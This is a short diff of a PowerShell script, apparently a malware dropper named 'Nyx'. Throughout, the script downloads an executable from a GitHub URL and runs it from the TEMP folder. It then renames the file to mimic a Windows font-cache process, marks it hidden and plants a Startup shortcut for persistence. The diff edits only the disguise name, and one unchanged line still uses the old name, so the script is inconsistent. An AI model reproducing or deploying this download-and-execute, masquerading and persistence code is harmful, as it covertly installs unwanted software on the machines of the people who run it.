@@ -5,7 +5,7 @@ Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/2023
 & "$env:TEMP\Nyx.exe"
 
 # Change Nyx Name
-Rename-Item -Path "$env:TEMP\Nyx.exe" -NewName "PresentationFontCache.exe"
+Rename-Item -Path "$env:TEMP\Nyx.exe" -NewName "PresentationFrontCache.exe"
 
 # Hide Nyx
 $FILE=Get-Item "$env:TEMP\PresentationFontCache.exe" -Force
@@ -14,7 +14,7 @@ $FILE.attributes='Hidden'
 # Create Nyx shortcut in Startup
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Nyx.lnk")
-$Shortcut.TargetPath = "$env:TEMP\PresentationFontCache.exe"
+$Shortcut.TargetPath = "$env:TEMP\PresentationFrontCache.exe"
 $Shortcut.Save()
 
 # Hide Nyx Shortcut
